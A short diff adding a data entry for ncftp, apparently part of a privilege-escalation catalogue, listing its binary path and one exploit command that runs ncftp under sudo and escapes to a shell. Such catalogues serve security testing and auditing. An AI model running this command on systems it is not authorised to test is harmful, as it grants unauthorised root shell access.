@@ -1,0 +1,4 @@
+name: ncftp
+binary_path: /usr/bin/ncftp
+exploit_cmds:
+- sudo /usr/bin/ncftp && !/bin/sh
